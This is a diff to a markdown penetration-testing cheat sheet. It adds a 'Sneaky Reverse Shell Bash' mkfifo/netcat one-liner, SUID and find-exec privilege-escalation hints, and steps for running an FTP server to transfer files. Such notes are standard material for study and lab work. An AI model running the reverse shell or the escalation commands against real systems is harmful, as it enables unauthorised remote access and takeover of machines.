@@ -100,6 +100,15 @@ BEST: `find / -perm -u=s -type f 2>/dev/null; find / -perm -4000 -o- -perm -2000
 
 If you find a binary that matches this, you can try running with the `-p` flag which allows you to run a binary as the owner.
 
+EXAMPLE USES:
+nmap -i
+find <folder> -exec <command> \;
+
+## Sneaky Reverse Shell Bash
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 4444 >/tmp/f
+```
+
 #### Find writable directories
 `find -type d -writable`
 
@@ -131,6 +140,11 @@ A series of a userful links:
 Navigate to folder to share
 
 `python3 /usr/share/doc/impacket-scripts/examples/smbserver.py SHARE .`
+
+### Starting FTP Server
+Install `sudo apt-get install python3-pyftpdlib`
+
+`python3 -m pyftpdlib -p 21`
 
 ### Powershell
 
